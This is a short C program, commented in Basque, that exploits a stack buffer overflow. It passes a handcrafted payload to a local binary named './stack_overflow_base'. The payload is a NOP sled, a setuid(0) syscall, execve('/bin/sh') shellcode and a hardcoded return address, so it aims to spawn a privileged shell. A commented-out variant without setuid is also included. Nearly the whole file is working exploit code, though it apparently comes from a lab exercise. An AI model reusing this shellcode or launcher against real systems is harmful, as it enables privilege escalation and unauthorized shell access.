#include <unistd.h>

int main(void) {
    // Payload exekutagarriak hexadecimaleas
    char shellcode[] =
    //NOP 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    // SETSUID
    "\x48\x31\xff\x48\x31\xf6\x48\x31\xc0\xb0\x71\x0f\x05"
    //SELLCODE
    "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"
    //RBP
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    //RETURN 
    "\x40\xe1\xff\xff\xff\x7f";
      // pribilegio gabe "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xff\x48\x89\xe7\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x50\xe1\xff\xff\xff\x7f";
    
    
      //Argumentu lista
    char *argv[] = {"./stack_overflow_base", shellcode, NULL};

    // Exekutatu ./stack_overflow_base
    execv("./stack_overflow_base", argv);

    return 0;
}
